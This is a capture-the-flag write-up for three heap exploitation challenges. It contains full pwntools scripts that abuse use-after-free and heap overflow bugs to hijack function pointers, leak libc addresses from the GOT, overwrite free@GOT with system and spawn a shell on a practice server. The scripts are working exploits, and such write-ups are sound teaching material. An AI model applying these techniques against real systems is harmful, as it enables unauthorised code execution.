# usemedontabuseme

> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNy11c2VtZWRvbnRhYnVzZW1lIiwiaXAiOiIyMDIuODcuMTYyLjI4Iiwic2Vzc2lvbiI6IjY1ZTg2OTA0LWY0OTgtNGJmOS05Y2UxLTg3MTIyNDU5NTgwMyJ9.9goGlKsse0NEwy8CH4Hx3pfdU0TDW9I831GzNf0z6To}

## Scenario

Functions are given that allow us to create, rename and delete a certain of each allocated memory structure. We need to leverage the fact that chunk metadata and content are stored in the same location.

## Solution

We are able to view the name of a killed clone. Due to the way free chunks are stored, the pointer of the next free chunk is stored in the same location as the name. This allows us to override the location of the second-next chunk location.  

By allocating a chunk (A), then allocating a chunk (B) that starts `0xc` bytes after (A), we can modify the function pointer. By using the Give Hint functionality, the modified function pointer will be executed

## Script

```python3
#!/usr/bin/python3

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
'''

'''
Data Structure

8 bytes - name
4 bytes - should be 0x6447
4 bytes - function ptr  <-- override to win
'''

# Clones --> []

from pwn import *

addr = {
    'win': 0x8048b98
}

# p = process("./usemedontabuseme")
p = remote("plsdonthaq.me", 7000)

p.recvuntil("Choice: ")

def make(id, string8):
    p.sendline("A")
    p.sendline(str(id))
    p.sendline(string8)
    p.recvuntil("Choice: ")

def kill(id):
    p.sendline("B")
    p.sendline(str(id))
    p.recvuntil("Choice: ")

def name(id, string7):
    p.sendline("C")
    p.sendline(str(id))
    p.sendline(string7)
    p.recvuntil("Choice: ")

def view(id):
    p.sendline("D")
    p.sendline(str(id))
    p.recvuntil("Name: ")
    ret = p.recvline(keepends=False)
    p.recvuntil("Choice: ")
    return ret

def hint(id):
    p.sendline("H")
    p.sendline(str(id))
    p.recvuntil("Choice: ")

def pwnHint(id):
    p.sendline("H")
    p.sendline(str(9))

# Create 3 allocations
make(0, '0000')
make(1, '1111')
make(2, '2222')

# Free the 3 allocations
### Result will be [2]->[1]->[0]
kill(0)
kill(1)
kill(2)

# Leak the addresses of [0] and [1]
addr0 = u32(view(1)[:4])
addr1 = u32(view(2)[:4])

# PWN                                                               # NEW HEAD:[2]->[1]->[0]
make(2, '')                 # Dummy [2]                             # NEW HEAD:[1]->[0]
name(0, p32(addr1 + 0xc))   # [1]->[0]->[1 + 0xc]                   # NEW HEAD:[1]->[0]->[1+0xc]
make(9, 'aaaa')             # Create clone 9 using Chunk [1]        # NEW HEAD:[0]->[1+0xc]
make(0, '')                 # Create clone 0 using Chunk [0]        # NEW HEAD:[1+0xc]
make(1, p32(addr['win']))   # Create clone 1 using Chunk [1 + 0xc]  # NEW HEAD:NULL

'''
# Chunk [1] now contains
aaaa   ...  ...... 
0x6447 ...  win fn
'''
pwnHint(9)

p.interactive()
```

# ezpz1

> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNy1lenB6MSIsImlwIjoiMjAyLjg3LjE2Mi4yOCIsInNlc3Npb24iOiJiNTgyYjYzNC1iMTRmLTRmNTUtYjk4NC1iODRlNTIzMTRhODQifQ.4rsVwrrOPi4_QH_pnZhEAfXEZ091FrVKrkZkhhqieO0}

## Scenario

The program performs two malloc calls for each question creation.  
When freed, if they are not cleared - their contents can be accessed.  
The order of freeing is also important, as the last freed item becomes the head of the free list.

## Solution

When creating and freeing a question, the two allocated chunks are freed in the wrong order.  
By still having access to previous container chunk, we can set the contents of a new question - which will actually modify the previous container chunk.

## Script

```python3
#!/usr/bin/python3

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
'''

from pwn import *

# p = process("./ezpz1")
p = remote("plsdonthaq.me", 7001)

winAddr = 0x8048a5c

wait = lambda: p.recvuntil("Enter your choice, (or press enter to refresh): ")

def create():
    p.sendline("C")
    wait()

def delete(id):
    p.sendline("D")
    p.sendline(str(id))
    wait()

def set(id, str_0x18):
    p.sendline("S")
    p.sendline(str(id))
    p.sendline(str_0x18)
    wait()

def ask(id):
    p.sendline("A")
    p.sendline(str(id))
    # wait()

wait()

######

create()  # Create question 0 (malloc container0, malloc buffer0)
delete(0) # Delete question 0 (free container0, free buffer0)
'''
    The free list is now
    HEAD:[buffer0]->[container0]
'''

create() # Create question 1 (malloc container1, malloc buffer1)
'''
    Question 1 uses [buffer0] as the container, and [container1] as the buffer
'''

set(1, p32(winAddr)) # Set *[buffer1] to the win address
'''
    But, [buffer1] == [container0]
    So we're setting *[container0] to the win address
'''

ask(0) # Call *[container0]
p.interactive()
```

---

# ezpz2

> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNy1lenB6MiIsImlwIjoiMjAyLjg3LjE2Mi4yOCIsInNlc3Npb24iOiIzZGNiYjlmNS00OTE0LTQ3NGItOGZlZi0wZDcwYjY1ODYxMmQifQ.VCWqJ7bjTz-O5uBUXy5bUEVknsi0mdJRBt-aPKRoZzc}

## Scenario

Compared to ezpz1, ezpz2 frees the two chunks for each question in the right order.  
However, the `fgets` function in `set_question` is vulnerable to a buffer overlfow.  

## Solution

By performing a buffer/heap overflow, we are able to control the contents chunks of adjacent questions.  
This allows us to modify the address of those questions' buffers.  
We can leak the address of the libc calls from the GOT table by overwriting the buffer location to the GOT table entry.  
By leaking several addresses, we can find the correct libc version - to then calculate the correct offset for the `system` call.  
The `free` address of the GOT can be overridden to the `system` call, to gain access to the shell.

## Script

```python3
#!/usr/bin/python3

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
'''

"""
:: set_question
fgets(*(eax+0x18), 0x78, stdin)
"""

from pwn import *

# p = process("./ezpz2")
p = remote("plsdonthaq.me", 7002)

bin_addr = {
    "puts@GOT": 0x804b02c,
    "free@GOT": 0x804b018,
    "getchar@GOT": 0x804b01c,
    "fgets@GOT": 0x804b020
}

libc_addr = dict()

wait = lambda: p.recvuntil("Enter your choice, (or press enter to refresh): ")

def create(*, flush=True):
    p.sendline("C")
    if flush: wait()

def delete(id, *, flush=True):
    p.sendline("D")
    p.sendline(str(id))
    if flush: wait()

def set(id, str_0x78, *, flush=True):
    p.sendline("S")
    p.sendline(str(id))
    p.sendline(str_0x78)
    if flush: wait()

def ask(id, *, flush=True):
    p.sendline("A")
    p.sendline(str(id))
    if flush: wait()

#######

wait()

# Create and delete ID 0, so that `free@GOT` is initialised
create()
delete(0)

# Create ID 1 and 2
create()
create()

set(2, "B" * 0x8) # Populate ID 2 for debugging purposes

def leak(func):
    payload = b''

    # Fill in the content of buffer[0]
    payload += b'A' * 0x18
    payload += b'\x00' * 4

    # Overflow buffer[0] to container[1]
    payload += p32(0x00000021)
    payload += b'\x00' * 0x18
    payload += p32(bin_addr[func + "@GOT"])   # Address to leak contents from
    payload += p32(0x00000021)                # Since fgets() appends an 0x0a at the end of the input
                                              # Preserve the chunk size header, and let fgets() overwrite buffer[1]
    set(1, payload)  # Write the payload

    # Now leak the contents
    ask(2, flush=False)
    p.recvuntil("I have the answer perhaps: '")
    libc_addr[func] = u32(p.recv(4)) # Store it into a dictionary

    wait()
    return libc_addr[func]

# Leak the libc addresses of `puts` and `free`
leak("puts")  # In my run I got: 0xf7dd9b40  
leak("free")  # In my run I got: 0xf7ded250
'''
Using `vmmap`, the base of libc was at 0xf7d72000

puts offset is 0x67b40
free offset is 0x7b250

These offsets match libc6_2.27-3ubuntu1_i386
'''

# Store the address of libc6_2.27-3ubuntu1_i386's `system`  function
libc_addr["system"] = libc_addr["puts"] - 0x2a940

"""
Now we want to override the address that `free@GOT` points to
As fgets() writes an 0x0a after input, we'll also leak getchar@GOT and fgets@GOT to keep their values
"""

leak("getchar") # Leak getchar
leak("fgets")   # Leak fgets
leak("free")    # re-leak free - Change the buffer address for ID 2 to point to free@GOT

# Payload to overwrite free@GOT
payload = b''
payload += p32(libc_addr["system"])
payload += p32(libc_addr["getchar"])
payload += p32(libc_addr["fgets"])
set(2, payload)

# Set the contents of buffer 1 to /bin/sh\0
set(1, "/bin/sh\0")

# Now call delete_question on question 1
# free (instruction at delete_question::0x8048922)
delete(1, flush=False)

p.interactive()
```

